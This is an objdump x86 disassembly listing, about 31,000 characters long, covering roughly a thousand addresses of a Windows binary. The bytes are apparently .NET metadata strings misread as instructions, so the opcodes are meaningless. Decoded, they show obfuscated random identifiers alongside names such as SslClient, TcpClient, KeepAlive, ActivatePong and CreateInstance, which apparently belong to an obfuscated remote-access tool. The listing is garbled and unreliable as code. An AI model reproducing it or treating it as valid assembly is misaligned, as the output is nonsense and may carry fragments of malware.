  407ff2:	49                   	dec    %ecx
  407ff3:	56                   	push   %esi
  407ff4:	00 64 46 63          	add    %ah,0x63(%esi,%eax,2)
  407ff8:	4e                   	dec    %esi
  407ff9:	61                   	popa
  407ffa:	4f                   	dec    %edi
  407ffb:	53                   	push   %ebx
  407ffc:	6d                   	insl   (%dx),%es:(%edi)
  407ffd:	68 49 56 00 6c       	push   $0x6c005649
  408002:	4a                   	dec    %edx
  408003:	7a 59                	jp     0x40805e
  408005:	6d                   	insl   (%dx),%es:(%edi)
  408006:	6d                   	insl   (%dx),%es:(%edi)
  408007:	7a 53                	jp     0x40805c
  408009:	66 45                	inc    %bp
  40800b:	50                   	push   %eax
  40800c:	55                   	push   %ebp
  40800d:	76 72                	jbe    0x408081
  40800f:	44                   	inc    %esp
  408010:	57                   	push   %edi
  408011:	00 4f 46             	add    %cl,0x46(%edi)
  408014:	7a 68                	jp     0x40807e
  408016:	46                   	inc    %esi
  408017:	7a 65                	jp     0x40807e
  408019:	68 70 54 5a 58       	push   $0x585a5470
  40801e:	65 58                	gs pop %eax
  408020:	57                   	push   %edi
  408021:	00 77 4e             	add    %dh,0x4e(%edi)
  408024:	4c                   	dec    %esp
  408025:	46                   	inc    %esi
  408026:	56                   	push   %esi
  408027:	50                   	push   %eax
  408028:	47                   	inc    %edi
  408029:	47                   	inc    %edi
  40802a:	53                   	push   %ebx
  40802b:	69 6f 76 62 57 00 58 	imul   $0x58005762,0x76(%edi),%ebp
  408032:	6b 53 46 64          	imul   $0x64,0x46(%ebx),%edx
  408036:	55                   	push   %ebp
  408037:	77 74                	ja     0x4080ad
  408039:	63 57 00             	arpl   %edx,0x0(%edi)
  40803c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40803e:	44                   	inc    %esp
  40803f:	44                   	inc    %esp
  408040:	61                   	popa
  408041:	48                   	dec    %eax
  408042:	61                   	popa
  408043:	4e                   	dec    %esi
  408044:	74 51                	je     0x408097
  408046:	69 57 00 6b 6c 63 4a 	imul   $0x4a636c6b,0x0(%edi),%edx
  40804d:	47                   	inc    %edi
  40804e:	42                   	inc    %edx
  40804f:	70 65                	jo     0x4080b6
  408051:	6f                   	outsl  %ds:(%esi),(%dx)
  408052:	57                   	push   %edi
  408053:	00 4d 72             	add    %cl,0x72(%ebp)
  408056:	41                   	inc    %ecx
  408057:	78 4a                	js     0x4080a3
  408059:	78 4b                	js     0x4080a6
  40805b:	47                   	inc    %edi
  40805c:	70 55                	jo     0x4080b3
  40805e:	53                   	push   %ebx
  40805f:	53                   	push   %ebx
  408060:	71 72                	jno    0x4080d4
  408062:	6b 41 58 00          	imul   $0x0,0x58(%ecx),%eax
  408066:	7a 65                	jp     0x4080cd
  408068:	4b                   	dec    %ebx
  408069:	6f                   	outsl  %ds:(%esi),(%dx)
  40806a:	4a                   	dec    %edx
  40806b:	57                   	push   %edi
  40806c:	6f                   	outsl  %ds:(%esi),(%dx)
  40806d:	6f                   	outsl  %ds:(%esi),(%dx)
  40806e:	6a 67                	push   $0x67
  408070:	46                   	inc    %esi
  408071:	47                   	inc    %edi
  408072:	58                   	pop    %eax
  408073:	00 50 73             	add    %dl,0x73(%eax)
  408076:	42                   	inc    %edx
  408077:	70 4a                	jo     0x4080c3
  408079:	65 49                	gs dec %ecx
  40807b:	78 75                	js     0x4080f2
  40807d:	67 73 4c             	addr16 jae 0x4080cc
  408080:	64 4e                	fs dec %esi
  408082:	58                   	pop    %eax
  408083:	00 4a 46             	add    %cl,0x46(%edx)
  408086:	57                   	push   %edi
  408087:	4b                   	dec    %ebx
  408088:	70 65                	jo     0x4080ef
  40808a:	68 7a 68 52 58       	push   $0x5852687a
  40808f:	00 55 62             	add    %dl,0x62(%ebp)
  408092:	52                   	push   %edx
  408093:	44                   	inc    %esp
  408094:	45                   	inc    %ebp
  408095:	75 79                	jne    0x408110
  408097:	4e                   	dec    %esi
  408098:	79 56                	jns    0x4080f0
  40809a:	58                   	pop    %eax
  40809b:	00 64 79 4c          	add    %ah,0x4c(%ecx,%edi,2)
  40809f:	4d                   	dec    %ebp
  4080a0:	53                   	push   %ebx
  4080a1:	70 59                	jo     0x4080fc
  4080a3:	53                   	push   %ebx
  4080a4:	69 61 77 56 6f 58 00 	imul   $0x586f56,0x77(%ecx),%esp
  4080ab:	54                   	push   %esp
  4080ac:	58                   	pop    %eax
  4080ad:	76 6d                	jbe    0x40811c
  4080af:	43                   	inc    %ebx
  4080b0:	52                   	push   %edx
  4080b1:	47                   	inc    %edi
  4080b2:	43                   	inc    %ebx
  4080b3:	54                   	push   %esp
  4080b4:	42                   	inc    %edx
  4080b5:	59                   	pop    %ecx
  4080b6:	00 63 4a             	add    %ah,0x4a(%ebx)
  4080b9:	77 75                	ja     0x408130
  4080bb:	41                   	inc    %ecx
  4080bc:	61                   	popa
  4080bd:	44                   	inc    %esp
  4080be:	72 6a                	jb     0x40812a
  4080c0:	78 42                	js     0x408104
  4080c2:	59                   	pop    %ecx
  4080c3:	00 50 46             	add    %dl,0x46(%eax)
  4080c6:	73 48                	jae    0x408110
  4080c8:	4d                   	dec    %ebp
  4080c9:	48                   	dec    %eax
  4080ca:	62 52 59             	bound  %edx,0x59(%edx)
  4080cd:	46                   	inc    %esi
  4080ce:	47                   	inc    %edi
  4080cf:	58                   	pop    %eax
  4080d0:	47                   	inc    %edi
  4080d1:	59                   	pop    %ecx
  4080d2:	00 61 57             	add    %ah,0x57(%ecx)
  4080d5:	4e                   	dec    %esi
  4080d6:	68 52 6a 53 61       	push   $0x61536a52
  4080db:	42                   	inc    %edx
  4080dc:	5a                   	pop    %edx
  4080dd:	4d                   	dec    %ebp
  4080de:	59                   	pop    %ecx
  4080df:	00 55 64             	add    %dl,0x64(%ebp)
  4080e2:	76 6a                	jbe    0x40814e
  4080e4:	69 75 7a 79 63 6d 49 	imul   $0x496d6379,0x7a(%ebp),%esi
  4080eb:	69 59 00 70 6e 52 41 	imul   $0x41526e70,0x0(%ecx),%ebx
  4080f2:	52                   	push   %edx
  4080f3:	4f                   	dec    %edi
  4080f4:	76 79                	jbe    0x40816f
  4080f6:	71 75                	jno    0x40816d
  4080f8:	65 77 42             	gs ja  0x40813d
  4080fb:	4e                   	dec    %esi
  4080fc:	6d                   	insl   (%dx),%es:(%edi)
  4080fd:	59                   	pop    %ecx
  4080fe:	00 75 48             	add    %dh,0x48(%ebp)
  408101:	51                   	push   %ecx
  408102:	56                   	push   %esi
  408103:	6a 56                	push   $0x56
  408105:	70 6d                	jo     0x408174
  408107:	68 6e 59 00 52       	push   $0x5200596e
  40810c:	65 4d                	gs dec %ebp
  40810e:	57                   	push   %edi
  40810f:	4b                   	dec    %ebx
  408110:	43                   	inc    %ebx
  408111:	4c                   	dec    %esp
  408112:	55                   	push   %ebp
  408113:	4b                   	dec    %ebx
  408114:	78 75                	js     0x40818b
  408116:	59                   	pop    %ecx
  408117:	00 6a 4a             	add    %ch,0x4a(%edx)
  40811a:	77 4c                	ja     0x408168
  40811c:	58                   	pop    %eax
  40811d:	6c                   	insb   (%dx),%es:(%edi)
  40811e:	6c                   	insb   (%dx),%es:(%edi)
  40811f:	6d                   	insl   (%dx),%es:(%edi)
  408120:	61                   	popa
  408121:	66 54                	push   %sp
  408123:	72 54                	jb     0x408179
  408125:	7a 59                	jp     0x408180
  408127:	00 61 4d             	add    %ah,0x4d(%ecx)
  40812a:	7a 4e                	jp     0x40817a
  40812c:	4d                   	dec    %ebp
  40812d:	71 61                	jno    0x408190
  40812f:	55                   	push   %ebp
  408130:	54                   	push   %esp
  408131:	6c                   	insb   (%dx),%es:(%edi)
  408132:	5a                   	pop    %edx
  408133:	4e                   	dec    %esi
  408134:	41                   	inc    %ecx
  408135:	5a                   	pop    %edx
  408136:	00 7a 74             	add    %bh,0x74(%edx)
  408139:	57                   	push   %edi
  40813a:	6e                   	outsb  %ds:(%esi),(%dx)
  40813b:	45                   	inc    %ebp
  40813c:	6d                   	insl   (%dx),%es:(%edi)
  40813d:	65 53                	gs push %ebx
  40813f:	71 43                	jno    0x408184
  408141:	5a                   	pop    %edx
  408142:	00 52 75             	add    %dl,0x75(%edx)
  408145:	63 67 47             	arpl   %esp,0x47(%edi)
  408148:	74 59                	je     0x4081a3
  40814a:	45                   	inc    %ebp
  40814b:	51                   	push   %ecx
  40814c:	51                   	push   %ecx
  40814d:	48                   	dec    %eax
  40814e:	5a                   	pop    %edx
  40814f:	00 4e 6f             	add    %cl,0x6f(%esi)
  408152:	73 4b                	jae    0x40819f
  408154:	4d                   	dec    %ebp
  408155:	75 42                	jne    0x408199
  408157:	58                   	pop    %eax
  408158:	5a                   	pop    %edx
  408159:	5a                   	pop    %edx
  40815a:	4a                   	dec    %edx
  40815b:	50                   	push   %eax
  40815c:	5a                   	pop    %edx
  40815d:	00 52 6a             	add    %dl,0x6a(%edx)
  408160:	72 72                	jb     0x4081d4
  408162:	4a                   	dec    %edx
  408163:	53                   	push   %ebx
  408164:	74 63                	je     0x4081c9
  408166:	64 4f                	fs dec %edi
  408168:	50                   	push   %eax
  408169:	5a                   	pop    %edx
  40816a:	00 6f 45             	add    %ch,0x45(%edi)
  40816d:	4d                   	dec    %ebp
  40816e:	67 4e                	addr16 dec %esi
  408170:	67 66 4f             	addr16 dec %di
  408173:	56                   	push   %esi
  408174:	43                   	inc    %ebx
  408175:	52                   	push   %edx
  408176:	5a                   	pop    %edx
  408177:	00 43 71             	add    %al,0x71(%ebx)
  40817a:	52                   	push   %edx
  40817b:	52                   	push   %edx
  40817c:	56                   	push   %esi
  40817d:	73 52                	jae    0x4081d1
  40817f:	6e                   	outsb  %ds:(%esi),(%dx)
  408180:	48                   	dec    %eax
  408181:	56                   	push   %esi
  408182:	5a                   	pop    %edx
  408183:	00 6c 6d 78          	add    %ch,0x78(%ebp,%ebp,2)
  408187:	77 50                	ja     0x4081d9
  408189:	74 67                	je     0x4081f2
  40818b:	59                   	pop    %ecx
  40818c:	66 6c                	data16 insb (%dx),%es:(%edi)
  40818e:	67 5a                	addr16 pop %edx
  408190:	00 4d 49             	add    %cl,0x49(%ebp)
  408193:	75 69                	jne    0x4081fe
  408195:	51                   	push   %ecx
  408196:	52                   	push   %edx
  408197:	52                   	push   %edx
  408198:	5a                   	pop    %edx
  408199:	5a                   	pop    %edx
  40819a:	52                   	push   %edx
  40819b:	4a                   	dec    %edx
  40819c:	72 5a                	jb     0x4081f8
  40819e:	00 4a 66             	add    %cl,0x66(%edx)
  4081a1:	69 6e 65 56 56 4a 63 	imul   $0x634a5656,0x65(%esi),%ebp
  4081a8:	41                   	inc    %ecx
  4081a9:	70 6a                	jo     0x408215
  4081ab:	4b                   	dec    %ebx
  4081ac:	74 5a                	je     0x408208
  4081ae:	00 76 61             	add    %dh,0x61(%esi)
  4081b1:	6c                   	insb   (%dx),%es:(%edi)
  4081b2:	75 65                	jne    0x408219
  4081b4:	5f                   	pop    %edi
  4081b5:	5f                   	pop    %edi
  4081b6:	00 62 50             	add    %ah,0x50(%edx)
  4081b9:	4d                   	dec    %ebp
  4081ba:	5a                   	pop    %edx
  4081bb:	4a                   	dec    %edx
  4081bc:	42                   	inc    %edx
  4081bd:	63 44 46 44          	arpl   %eax,0x44(%esi,%eax,2)
  4081c1:	61                   	popa
  4081c2:	00 63 4a             	add    %ah,0x4a(%ebx)
  4081c5:	5a                   	pop    %edx
  4081c6:	75 72                	jne    0x40823a
  4081c8:	7a 53                	jp     0x40821d
  4081ca:	51                   	push   %ecx
  4081cb:	41                   	inc    %ecx
  4081cc:	49                   	dec    %ecx
  4081cd:	61                   	popa
  4081ce:	00 69 51             	add    %ch,0x51(%ecx)
  4081d1:	47                   	inc    %edi
  4081d2:	6c                   	insb   (%dx),%es:(%edi)
  4081d3:	71 4d                	jno    0x408222
  4081d5:	4d                   	dec    %ebp
  4081d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d7:	68 6f 58 49 61       	push   $0x6149586f
  4081dc:	00 43 6e             	add    %al,0x6e(%ebx)
  4081df:	72 56                	jb     0x408237
  4081e1:	69 45 73 78 63 61 00 	imul   $0x616378,0x73(%ebp),%eax
  4081e8:	4f                   	dec    %edi
  4081e9:	46                   	inc    %esi
  4081ea:	44                   	inc    %esp
  4081eb:	49                   	dec    %ecx
  4081ec:	57                   	push   %edi
  4081ed:	59                   	pop    %ecx
  4081ee:	53                   	push   %ebx
  4081ef:	51                   	push   %ecx
  4081f0:	43                   	inc    %ebx
  4081f1:	45                   	inc    %ebp
  4081f2:	64 61                	fs popa
  4081f4:	00 54 6b 77          	add    %dl,0x77(%ebx,%ebp,2)
  4081f8:	73 78                	jae    0x408272
  4081fa:	70 47                	jo     0x408243
  4081fc:	68 4c 6f 4b 73       	push   $0x734b6f4c
  408201:	61                   	popa
  408202:	00 59 41             	add    %bl,0x41(%ecx)
  408205:	53                   	push   %ebx
  408206:	4d                   	dec    %ebp
  408207:	62 61 53             	bound  %esp,0x53(%ecx)
  40820a:	65 44                	gs inc %esp
  40820c:	62 00                	bound  %eax,(%eax)
  40820e:	66 42                	inc    %dx
  408210:	57                   	push   %edi
  408211:	63 4b 44             	arpl   %ecx,0x44(%ebx)
  408214:	78 6f                	js     0x408285
  408216:	49                   	dec    %ecx
  408217:	62 00                	bound  %eax,(%eax)
  408219:	57                   	push   %edi
  40821a:	49                   	dec    %ecx
  40821b:	45                   	inc    %ebp
  40821c:	58                   	pop    %eax
  40821d:	67 69 79 7a 6a 71 63 	imul   $0x6363716a,0x7a(%bx,%di),%edi
  408224:	63 
  408225:	62 00                	bound  %eax,(%eax)
  408227:	46                   	inc    %esi
  408228:	59                   	pop    %ecx
  408229:	57                   	push   %edi
  40822a:	57                   	push   %edi
  40822b:	71 47                	jno    0x408274
  40822d:	47                   	inc    %edi
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	46                   	inc    %esi
  408230:	53                   	push   %ebx
  408231:	68 62 00 6d 73       	push   $0x736d0062
  408236:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408239:	6c                   	insb   (%dx),%es:(%edi)
  40823a:	69 62 00 42 6d 69 4a 	imul   $0x4a696d42,0x0(%edx),%esp
  408241:	4a                   	dec    %edx
  408242:	42                   	inc    %edx
  408243:	52                   	push   %edx
  408244:	49                   	dec    %ecx
  408245:	54                   	push   %esp
  408246:	6b 4c 6e 62 00       	imul   $0x0,0x62(%esi,%ebp,2),%ecx
  40824b:	74 50                	je     0x40829d
  40824d:	78 6c                	js     0x4082bb
  40824f:	50                   	push   %eax
  408250:	70 55                	jo     0x4082a7
  408252:	70 72                	jo     0x4082c6
  408254:	44                   	inc    %esp
  408255:	78 62                	js     0x4082b9
  408257:	00 6f 41             	add    %ch,0x41(%edi)
  40825a:	73 66                	jae    0x4082c2
  40825c:	62 57 46             	bound  %edx,0x46(%edi)
  40825f:	53                   	push   %ebx
  408260:	69 67 78 62 00 65 66 	imul   $0x66650062,0x78(%edi),%esp
  408267:	43                   	inc    %ebx
  408268:	69 53 65 58 74 44 63 	imul   $0x63447458,0x65(%ebx),%edx
  40826f:	00 46 6e             	add    %al,0x6e(%esi)
  408272:	49                   	dec    %ecx
  408273:	43                   	inc    %ebx
  408274:	66 6c                	data16 insb (%dx),%es:(%edi)
  408276:	72 77                	jb     0x4082ef
  408278:	41                   	inc    %ecx
  408279:	51                   	push   %ecx
  40827a:	63 00                	arpl   %eax,(%eax)
  40827c:	58                   	pop    %eax
  40827d:	67 49                	addr16 dec %ecx
  40827f:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  408281:	6e                   	outsb  %ds:(%esi),(%dx)
  408282:	46                   	inc    %esi
  408283:	79 42                	jns    0x4082c7
  408285:	4c                   	dec    %esp
  408286:	77 45                	ja     0x4082cd
  408288:	59                   	pop    %ecx
  408289:	63 00                	arpl   %eax,(%eax)
  40828b:	4d                   	dec    %ebp
  40828c:	44                   	inc    %esp
  40828d:	53                   	push   %ebx
  40828e:	6d                   	insl   (%dx),%es:(%edi)
  40828f:	5a                   	pop    %edx
  408290:	42                   	inc    %edx
  408291:	67 75 61             	addr16 jne 0x4082f5
  408294:	63 00                	arpl   %eax,(%eax)
  408296:	57                   	push   %edi
  408297:	72 47                	jb     0x4082e0
  408299:	64 53                	fs push %ebx
  40829b:	7a 43                	jp     0x4082e0
  40829d:	44                   	inc    %esp
  40829e:	58                   	pop    %eax
  40829f:	6a 66                	push   $0x66
  4082a1:	63 00                	arpl   %eax,(%eax)
  4082a3:	53                   	push   %ebx
  4082a4:	79 73                	jns    0x408319
  4082a6:	74 65                	je     0x40830d
  4082a8:	6d                   	insl   (%dx),%es:(%edi)
  4082a9:	2e 43                	cs inc %ebx
  4082ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ac:	6c                   	insb   (%dx),%es:(%edi)
  4082ad:	6c                   	insb   (%dx),%es:(%edi)
  4082ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b4:	73 2e                	jae    0x4082e4
  4082b6:	47                   	inc    %edi
  4082b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082b9:	65 72 69             	gs jb  0x408325
  4082bc:	63 00                	arpl   %eax,(%eax)
  4082be:	4d                   	dec    %ebp
  4082bf:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4082c6:	74 2e                	je     0x4082f6
  4082c8:	56                   	push   %esi
  4082c9:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4082d0:	73 69                	jae    0x40833b
  4082d2:	63 00                	arpl   %eax,(%eax)
  4082d4:	67 65 74 5f          	addr16 gs je 0x408337
  4082d8:	53                   	push   %ebx
  4082d9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082db:	64 53                	fs push %ebx
  4082dd:	79 6e                	jns    0x40834d
  4082df:	63 00                	arpl   %eax,(%eax)
  4082e1:	42                   	inc    %edx
  4082e2:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  4082e4:	61                   	popa
  4082e5:	4f                   	dec    %edi
  4082e6:	47                   	inc    %edi
  4082e7:	69 56 72 63 00 7a 6e 	imul   $0x6e7a0063,0x72(%esi),%edx
  4082ee:	69 52 4c 51 41 65 41 	imul   $0x41654151,0x4c(%edx),%edx
  4082f5:	56                   	push   %esi
  4082f6:	6b 58 61 64          	imul   $0x64,0x61(%eax),%ebx
  4082fa:	00 45 6e             	add    %al,0x6e(%ebp)
  4082fd:	64 52                	fs push %edx
  4082ff:	65 61                	gs popa
  408301:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408305:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  40830c:	00 
  40830d:	54                   	push   %esp
  40830e:	68 72 65 61 64       	push   $0x64616572
  408313:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  408317:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40831b:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  40831f:	41                   	inc    %ecx
  408320:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408326:	61                   	popa
  408327:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  40832d:	74 5f                	je     0x40838e
  40832f:	43                   	inc    %ebx
  408330:	6f                   	outsl  %ds:(%esi),(%dx)
  408331:	6e                   	outsb  %ds:(%esi),(%dx)
  408332:	6e                   	outsb  %ds:(%esi),(%dx)
  408333:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408338:	00 67 65             	add    %ah,0x65(%edi)
  40833b:	74 5f                	je     0x40839c
  40833d:	49                   	dec    %ecx
  40833e:	73 43                	jae    0x408383
  408340:	6f                   	outsl  %ds:(%esi),(%dx)
  408341:	6e                   	outsb  %ds:(%esi),(%dx)
  408342:	6e                   	outsb  %ds:(%esi),(%dx)
  408343:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408348:	00 73 65             	add    %dh,0x65(%ebx)
  40834b:	74 5f                	je     0x4083ac
  40834d:	49                   	dec    %ecx
  40834e:	73 43                	jae    0x408393
  408350:	6f                   	outsl  %ds:(%esi),(%dx)
  408351:	6e                   	outsb  %ds:(%esi),(%dx)
  408352:	6e                   	outsb  %ds:(%esi),(%dx)
  408353:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408358:	00 67 65             	add    %ah,0x65(%edi)
  40835b:	74 5f                	je     0x4083bc
  40835d:	47                   	inc    %edi
  40835e:	75 69                	jne    0x4083c9
  408360:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  408364:	65 6e                	outsb  %gs:(%esi),(%dx)
  408366:	64 53                	fs push %ebx
  408368:	79 6e                	jns    0x4083d8
  40836a:	63 3e                	arpl   %edi,(%esi)
  40836c:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408370:	61                   	popa
  408371:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408374:	6e                   	outsb  %ds:(%esi),(%dx)
  408375:	67 46                	addr16 inc %esi
  408377:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40837e:	73 43                	jae    0x4083c3
  408380:	6f                   	outsl  %ds:(%esi),(%dx)
  408381:	6e                   	outsb  %ds:(%esi),(%dx)
  408382:	6e                   	outsb  %ds:(%esi),(%dx)
  408383:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408388:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40838d:	61                   	popa
  40838e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408391:	6e                   	outsb  %ds:(%esi),(%dx)
  408392:	67 46                	addr16 inc %esi
  408394:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  40839b:	65 65 70 41          	gs gs jo 0x4083e0
  40839f:	6c                   	insb   (%dx),%es:(%edi)
  4083a0:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4083a7:	42                   	inc    %edx
  4083a8:	61                   	popa
  4083a9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ad:	67 46                	addr16 inc %esi
  4083af:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4083b6:	65 61                	gs popa
  4083b8:	64 65 72 53          	fs gs jb 0x40840f
  4083bc:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4083c3:	42                   	inc    %edx
  4083c4:	61                   	popa
  4083c5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c9:	67 46                	addr16 inc %esi
  4083cb:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4083d2:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4083d9:	42                   	inc    %edx
  4083da:	61                   	popa
  4083db:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083de:	6e                   	outsb  %ds:(%esi),(%dx)
  4083df:	67 46                	addr16 inc %esi
  4083e1:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  4083e8:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4083ec:	61                   	popa
  4083ed:	74 65                	je     0x408454
  4083ef:	50                   	push   %eax
  4083f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f2:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  4083f8:	61                   	popa
  4083f9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fd:	67 46                	addr16 inc %esi
  4083ff:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408406:	6e                   	outsb  %ds:(%esi),(%dx)
  408407:	74 65                	je     0x40846e
  408409:	72 76                	jb     0x408481
  40840b:	61                   	popa
  40840c:	6c                   	insb   (%dx),%es:(%edi)
  40840d:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408412:	61                   	popa
  408413:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408416:	6e                   	outsb  %ds:(%esi),(%dx)
  408417:	67 46                	addr16 inc %esi
  408419:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408420:	75 66                	jne    0x408488
  408422:	66 65 72 3e          	data16 gs jb 0x408464
  408426:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40842a:	61                   	popa
  40842b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40842e:	6e                   	outsb  %ds:(%esi),(%dx)
  40842f:	67 46                	addr16 inc %esi
  408431:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  408438:	66 66 73 65          	data16 data16 jae 0x4084a1
  40843c:	74 3e                	je     0x40847c
  40843e:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408442:	61                   	popa
  408443:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408446:	6e                   	outsb  %ds:(%esi),(%dx)
  408447:	67 46                	addr16 inc %esi
  408449:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408450:	73 6c                	jae    0x4084be
  408452:	43                   	inc    %ebx
  408453:	6c                   	insb   (%dx),%es:(%edi)
  408454:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40845b:	5f                   	pop    %edi
  40845c:	42                   	inc    %edx
  40845d:	61                   	popa
  40845e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408461:	6e                   	outsb  %ds:(%esi),(%dx)
  408462:	67 46                	addr16 inc %esi
  408464:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  40846b:	63 70 43             	arpl   %esi,0x43(%eax)
  40846e:	6c                   	insb   (%dx),%es:(%edi)
  40846f:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408476:	5f                   	pop    %edi
  408477:	42                   	inc    %edx
  408478:	61                   	popa
  408479:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40847c:	6e                   	outsb  %ds:(%esi),(%dx)
  40847d:	67 46                	addr16 inc %esi
  40847f:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  408486:	70 65                	jo     0x4084ed
  408488:	6e                   	outsb  %ds:(%esi),(%dx)
  408489:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40848d:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408494:	61 
  408495:	6c                   	insb   (%dx),%es:(%edi)
  408496:	75 65                	jne    0x4084fd
  408498:	4b                   	dec    %ebx
  408499:	69 6e 64 00 54 4e 58 	imul   $0x584e5400,0x64(%esi),%ebp
  4084a0:	45                   	inc    %ebp
  4084a1:	78 48                	js     0x4084eb
  4084a3:	74 6c                	je     0x408511
  4084a5:	6d                   	insl   (%dx),%es:(%edi)
  4084a6:	68 4f 6a 75 6f       	push   $0x6f756a4f
  4084ab:	64 00 41 6d          	add    %al,%fs:0x6d(%ecx)
  4084af:	52                   	push   %edx
  4084b0:	6a 67                	push   $0x67
  4084b2:	73 69                	jae    0x40851d
  4084b4:	6d                   	insl   (%dx),%es:(%edi)
  4084b5:	47                   	inc    %edi
  4084b6:	65 00 49 69          	add    %cl,%gs:0x69(%ecx)
  4084ba:	79 72                	jns    0x40852e
  4084bc:	46                   	inc    %esi
  4084bd:	7a 71                	jp     0x408530
  4084bf:	49                   	dec    %ecx
  4084c0:	7a 49                	jp     0x40850b
  4084c2:	65 00 65 5a          	add    %ah,%gs:0x5a(%ebp)
  4084c6:	72 54                	jb     0x40851c
  4084c8:	61                   	popa
  4084c9:	52                   	push   %edx
  4084ca:	67 6c                	insb   (%dx),%es:(%di)
  4084cc:	41                   	inc    %ecx
  4084cd:	67 62 4a 65          	bound  %ecx,0x65(%bp,%si)
  4084d1:	00 52 65             	add    %dl,0x65(%edx)
  4084d4:	70 6c                	jo     0x408542
  4084d6:	61                   	popa
  4084d7:	63 65 00             	arpl   %esp,0x0(%ebp)
  4084da:	43                   	inc    %ebx
  4084db:	72 65                	jb     0x408542
  4084dd:	61                   	popa
  4084de:	74 65                	je     0x408545
  4084e0:	49                   	dec    %ecx
  4084e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e2:	73 74                	jae    0x408558
  4084e4:	61                   	popa
  4084e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e6:	63 65 00             	arpl   %esp,0x0(%ebp)
  4084e9:	73 65                	jae    0x408550
  4084eb:	74 5f                	je     0x40854c
  4084ed:	4d                   	dec    %ebp
  4084ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ef:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  4084f4:	6c                   	insb   (%dx),%es:(%edi)
  4084f5:	65 4d                	gs dec %ebp
  4084f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f8:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  4084fd:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408504:	64 65 
  408506:	00 45 6e             	add    %al,0x6e(%ebp)
  408509:	74 65                	je     0x408570
